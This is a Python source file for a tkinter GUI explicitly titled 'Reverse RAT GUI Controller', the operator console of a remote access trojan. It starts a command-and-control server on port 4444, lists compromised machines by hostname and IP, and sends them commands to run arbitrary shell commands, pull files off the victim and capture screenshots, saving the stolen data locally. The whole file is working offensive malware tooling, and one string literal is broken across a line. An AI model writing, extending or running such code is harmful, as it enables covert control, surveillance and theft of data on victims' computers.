```python
import base64
import threading
import tkinter as tk

from server import C2Server


class RemoteAdminGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Reverse RAT GUI Controller")

        self.server = None
        self.running = False

        # --- controls ---
        tk.Label(root, text="Host:").grid(row=0, column=0, sticky="e")
        self.host_var = tk.StringVar(value="0.0.0.0")
        tk.Entry(root, textvariable=self.host_var).grid(row=0, column=1, sticky="we")

        tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e")
        self.port_var = tk.StringVar(value="4444")
        tk.Entry(root, textvariable=self.port_var).grid(row=1, column=1, sticky="we")

        tk.Label(root, text="Token:").grid(row=2, column=0, sticky="e")
        self.token_var = tk.StringVar(value="change-me")
        tk.Entry(root, textvariable=self.token_var).grid(row=2, column=1, sticky="we")

        tk.Button(root, text="Start Server", command=self.start_server).grid(
            row=3, column=0, columnspan=2, sticky="we", pady=4
        )

        # --- session list ---
        tk.Label(root, text="Active Sessions:").grid(
            row=4, column=0, columnspan=2, sticky="w"
        )
        self.session_list = tk.Listbox(root, height=6)
        self.session_list.grid(
            row=5, column=0, columnspan=2, sticky="nsew", padx=4, pady=4
        )

        # --- command area ---
        self.command_entry = tk.Entry(root)
        self.command_entry.grid(
            row=6, column=0, columnspan=2, sticky="we", padx=4, pady=2
        )
        self.command_entry.bind("<Return>", lambda e: self.send_command())

        tk.Button(root, text="Send Command", command=self.send_command).grid(
            row=7, column=0, columnspan=2, sticky="we", pady=2
        )

        # --- log/output ---
        self.output = tk.Text(root, height=12)
        self.output.grid(row=8, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)

        root.columnconfigure(1, weight=1)
        root.rowconfigure(8, weight=1)

    def log(self, msg):
        self.output.insert(tk.END, str(msg) + "\n")
        self.output.see(tk.END)

    def start_server(self):
        if self.server:
            return

        host = self.host_var.get()
        port = int(self.port_var.get())
        token = self.token_var.get()

        self.server = C2Server(host, port, token, log=self.log)
        self.server.start()
        self.running = True
        self.update_sessions()

    def update_sessions(self):
        if not self.running:
            return

        self.session_list.delete(0, tk.END)
        if self.server:
            for s in self.server.sessions:
                if s.alive:
                    self.session_list.insert(
                        tk.END,
                        f"{s.id}: {s.info.get('hostname')} ({s.addr[0]})",
                    )

        self.root.after(1000, self.update_sessions)

    def selected_session(self):
        if not self.server:
            return None
        sel = self.session_list.curselection()
        if not sel:
            return None
        idx = sel[0]
        if idx >= len(self.server.sessions):
            return None
        session = self.server.sessions[idx]
        if not session.alive:
            return None
        return session

    def send_command(self):
        session = self.selected_session()
        if not session:
            self.log("[-] No active session selected")
            return

        cmd = self.command_entry.get().strip()
        if not cmd:
            return

        self.command_entry.delete(0, tk.END)

        def worker():
            try:
                if cmd == "ping":
                    resp = session.command({"type": "ping"})
                    out = resp.get("data", "")

                elif cmd.startswith("exec "):
                    resp = session.command({"type": "exec", "cmd": cmd[5:]})
                    out = resp.get("data", "")

                elif cmd.startswith("download "):
                    parts = cmd.split()
                    if len(parts) != 3:
                        out = "Usage: download <remote> <local>"
                    else:
                        _, remote, local = parts
                        resp = session.command(
                            {"type": "download", "remote_path": remote}
                        )
                        if resp.get("ok"):
                            with open(local, "wb") as f:
                                f.write(base64.b64decode(resp["data"]))
                            out = f"[+] Downloaded to {local}"
                        else:
                            out = resp.get("data", "")

                elif cmd == "screenshot":
                    resp = session.command({"type": "screenshot"})
                    if resp.get("ok"):
                        path = f"session_{session.id}_screenshot.png"
                        with open(path, "wb") as f:
                            f.write(base64.b64decode(resp["data"]))
                        out = f"[+] Screenshot saved to {path}"
                    else:
                        out = resp.get("data", "")

                else:
                    out = "Unsupported command. Use exec <cmd>, ping, download <remote>
 <local>, screenshot"

            except Exception as e:
                out = f"Error: {e}"

            self.root.after(0, lambda: self.log(out))

        threading.Thread(target=worker, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteAdminGUI(root)
    root.mainloop()
```
